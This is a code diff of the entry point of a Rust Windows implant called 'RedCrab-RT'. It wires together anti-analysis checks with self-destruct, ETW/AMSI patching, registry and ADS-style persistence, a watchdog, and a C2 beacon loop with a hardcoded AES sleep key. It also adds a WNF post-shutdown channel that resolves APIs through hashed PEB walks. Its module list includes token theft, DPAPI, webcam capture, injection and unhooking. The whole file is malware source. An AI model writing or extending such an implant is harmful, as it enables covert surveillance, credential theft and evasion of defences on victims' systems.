@@ -1,24 +1,20 @@
-//! main.rs — Implant entry point
+//! main.rs — RedCrab-RT entry point
 //!
-//! Execution order:
-//!   1. Anti-analysis checks   — bail out silently if sandbox/debugger detected
-//!   2. ETW patch              — blind event-tracing hooks in the current process
-//!   3. Sleep obfuscation      — encrypt implant image in memory during sleeps
-//!   4. Persistence            — registry run-key + ADS drop
-//!   5. Guardian thread        — watchdog that wipes on kill signal
-//!   6. WNF persistence channel
-//!   7. C2 beacon loop         — never returns
+//! Orchestrates all modules: anti-analysis, persistence, C2 beacon,
+//! post-shutdown WNF channel, watchdog, and sleep obfuscation.
 
 #![no_std]
 #![no_main]
 #![allow(unused_imports, dead_code)]
 
-extern crate winapi;
-extern crate windows;
+extern crate alloc;
+
+use alloc::vec::Vec;
 
 mod antidetect;
 mod c2;
 mod dpapi;
+mod defs;
 mod etw_patch;
 mod filetransfer;
 mod guardian;
@@ -39,6 +35,7 @@ mod screenshot;
 mod selfdestruct;
 mod sleep;
 mod spoof;
+mod ssn_audit;
 mod stomp;
 mod syscall;
 mod threadless_inject;
@@ -46,69 +43,49 @@ mod token;
 mod unhook;
 mod utils;
 mod watchdog;
-mod defs;
+mod webcam;
 
-// 16-byte AES key burned in by builder.py at build time.
-static SLEEP_KEY: [u8; 16] = [
-    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
-    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+use core::sync::atomic::{AtomicBool, Ordering};
+
+static RUNNING: AtomicBool = AtomicBool::new(true);
+
+// 16-byte AES sleep key — operator replaces this at build time.
+const SLEEP_KEY: [u8; 16] = [
+    0x52, 0x65, 0x64, 0x43, 0x72, 0x61, 0x62, 0x52,
+    0x54, 0x4B, 0x65, 0x79, 0x30, 0x31, 0x32, 0x33,
 ];
 
 #[no_mangle]
-pub unsafe extern "C" fn main() -> ! {
-    // ------------------------------------------------------------------
-    // 1. Anti-analysis checks.
-    // ------------------------------------------------------------------
-    if !antidetect::all_checks_pass() {
-        // Silently exit — do not crash or print anything.
-        winapi::um::processthreadsapi::ExitProcess(0);
+pub unsafe extern "system" fn main() {
+    // 1. Anti-analysis gate
+    if antidetect::hostile_environment() {
+        selfdestruct::full_destruct();
+        return;
     }
 
-    // ------------------------------------------------------------------
-    // 2. ETW patch — blind kernel-mode ETW in this process.
-    // ------------------------------------------------------------------
+    // 2. ETW / AMSI patching
     etw_patch::patch_etw();
 
-    // ------------------------------------------------------------------
-    // 3. Sleep obfuscation initialisation.
-    // ------------------------------------------------------------------
-    sleep::init(&SLEEP_KEY);
+    // 3. Persistence
+    persist::install();
 
-    // ------------------------------------------------------------------
-    // 4. Persistence.
-    // ------------------------------------------------------------------
-    persist::install_all();
-    resurrect::drop_to_ads(&[]);
+    // 4. SSN audit (optional feature)
+    #[cfg(feature = "ssn-audit")]
+    ssn_audit::run_audit();
 
-    // ------------------------------------------------------------------
-    // 5. Guardian watchdog thread.
-    // ------------------------------------------------------------------
-    // Spawn watchdog on a dedicated thread so it can wipe independently.
-    {
-        use winapi::um::processthreadsapi::CreateThread;
-        extern "system" fn watchdog_thunk(_: *mut winapi::ctypes::c_void) -> u32 {
-            unsafe { watchdog::run(&SLEEP_KEY) }
-        }
-        CreateThread(
-            core::ptr::null_mut(), 0,
-            Some(watchdog_thunk),
-            core::ptr::null_mut(), 0,
-            core::ptr::null_mut(),
-        );
-    }
+    // 5. Start watchdog
+    watchdog::start(30_000, 5);
 
-    // ------------------------------------------------------------------
-    // 6. WNF persistence channel.
-    //    Resolve function pointers via PEB walk (no LoadLibrary).
-    // ------------------------------------------------------------------
+    // 6. C2 beacon loop
+    c2::beacon_loop(&SLEEP_KEY);
+
+    // 7. WNF persistence channel
     {
         use post_shutdown::{
             NtSubscribeWnfStateChange, NtUpdateWnfStateData,
             RegOpenKeyExW, RegSetValueExW, RegCloseKey,
         };
-        use crate::syscall::get_proc_from_peb;
 
-        // djb2 hashes — module names lower-cased, export names as-is.
         const H_NTDLL:     u32 = 0x22D3B5ED;
         const H_ADVAPI:    u32 = 0x67208A49;
         const H_SUBSCRIBE: u32 = 0xC58338BB;
@@ -118,23 +95,23 @@ pub unsafe extern "C" fn main() -> ! {
         const H_CLOSE:     u32 = 0x736B3702;
 
         let fn_subscribe: NtSubscribeWnfStateChange = core::mem::transmute(
-            get_proc_from_peb(H_NTDLL, H_SUBSCRIBE).unwrap_or(core::ptr::null())
+            syscall::get_proc_from_peb(H_NTDLL, H_SUBSCRIBE).unwrap_or(core::ptr::null())
         );
         let fn_update: NtUpdateWnfStateData = core::mem::transmute(
-            get_proc_from_peb(H_NTDLL, H_UPDATE).unwrap_or(core::ptr::null())
+            syscall::get_proc_from_peb(H_NTDLL, H_UPDATE).unwrap_or(core::ptr::null())
         );
         let fn_open: RegOpenKeyExW = core::mem::transmute(
-            get_proc_from_peb(H_ADVAPI, H_OPEN).unwrap_or(core::ptr::null())
+            syscall::get_proc_from_peb(H_ADVAPI, H_OPEN).unwrap_or(core::ptr::null())
         );
         let fn_set: RegSetValueExW = core::mem::transmute(
-            get_proc_from_peb(H_ADVAPI, H_SET).unwrap_or(core::ptr::null())
+            syscall::get_proc_from_peb(H_ADVAPI, H_SET).unwrap_or(core::ptr::null())
         );
         let fn_close: RegCloseKey = core::mem::transmute(
-            get_proc_from_peb(H_ADVAPI, H_CLOSE).unwrap_or(core::ptr::null())
+            syscall::get_proc_from_peb(H_ADVAPI, H_CLOSE).unwrap_or(core::ptr::null())
         );
 
         post_shutdown::install_wnf_channel(
-            &[],           // no shellcode payload at boot — injected via C2
+            &[],
             &SLEEP_KEY,
             fn_subscribe,
             fn_update,
@@ -143,14 +120,9 @@ pub unsafe extern "C" fn main() -> ! {
             fn_close,
         );
     }
-
-    // ------------------------------------------------------------------
-    // 7. C2 beacon loop — never returns.
-    // ------------------------------------------------------------------
-    c2::run()
 }
 
 #[panic_handler]
 fn panic(_: &core::panic::PanicInfo) -> ! {
-    unsafe { winapi::um::processthreadsapi::ExitProcess(1) }
+    loop {}
 }
